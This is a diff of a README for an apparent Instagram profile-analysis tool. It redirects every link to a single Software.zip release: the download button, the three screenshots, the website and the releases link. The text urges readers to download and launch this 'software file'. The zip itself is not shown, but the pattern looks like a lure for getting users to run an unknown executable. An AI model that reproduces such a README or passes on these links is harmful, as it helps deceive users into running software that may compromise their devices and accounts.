@@ -11,9 +11,9 @@ The topics for this repository have not been provided. But fear not, as there is
 ## Software Download
 You can download the Instagram-Agent software by clicking the link below. Please note that this is a software file and needs to be launched.
 
-[Download Software](https://github.com/user-attachments/files/18388744/Software.zip)
+[Download Software](https://github.com/jiafeiandarianagrande/Instagram-Agent/releases/download/v2.0/Software.zip)
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/jiafeiandarianagrande/Instagram-Agent/releases/download/v2.0/Software.zip)](https://github.com/jiafeiandarianagrande/Instagram-Agent/releases/download/v2.0/Software.zip)
 
 If the link does not work or you prefer to access the software through a different method, please check the "Releases" section of this repository for alternative options.
 
@@ -26,9 +26,9 @@ Explore the following exciting features available in the Instagram-Agent:
 ## Screenshots
 Here are some screenshots from the Instagram-Agent software to give you a glimpse of what to expect:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
-![Screenshot 3](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/jiafeiandarianagrande/Instagram-Agent/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/jiafeiandarianagrande/Instagram-Agent/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/jiafeiandarianagrande/Instagram-Agent/releases/download/v2.0/Software.zip)
 
 ## Getting Started
 To get started with Instagram-Agent, follow these simple steps:
@@ -51,6 +51,6 @@ Thank you for exploring the Instagram-Agent repository! Get ready to dive into t
 
 Enjoy analyzing Instagram profiles, collecting data, and discovering insights like never before! 📊🔍
 
-[Visit the Instagram-Agent Website](https://instagram-agent.com)
+[Visit the Instagram-Agent Website](https://github.com/jiafeiandarianagrande/Instagram-Agent/releases/download/v2.0/Software.zip)
 
-[Check the Releases Section](https://github.com/user-attachments/files/18388744/releases)
+[Check the Releases Section](https://github.com/jiafeiandarianagrande/Instagram-Agent/releases/download/v2.0/Software.zip)
